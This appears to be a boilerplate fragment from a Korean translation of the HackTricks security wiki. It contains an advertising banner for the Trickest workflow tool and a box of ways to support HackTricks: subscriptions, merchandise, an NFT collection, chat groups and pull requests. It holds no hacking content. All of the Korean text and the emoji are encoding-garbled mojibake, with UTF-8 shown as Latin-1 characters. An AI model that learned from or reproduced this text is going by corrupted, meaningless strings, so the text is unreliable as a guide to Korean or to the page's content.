<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì„¸ê³„ì—ì„œ ê°€ì¥ **ê³ ê¸‰** ì»¤ë®¤ë‹ˆí‹° ë„êµ¬ë¡œ êµ¬ë™ë˜ëŠ” **ì›Œí¬í”Œë¡œìš°ë¥¼ ì‰½ê²Œ êµ¬ì¶•í•˜ê³  ìë™í™”**í•˜ì„¸ìš”.\
ì˜¤ëŠ˜ ì•¡ì„¸ìŠ¤í•˜ì„¸ìš”:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
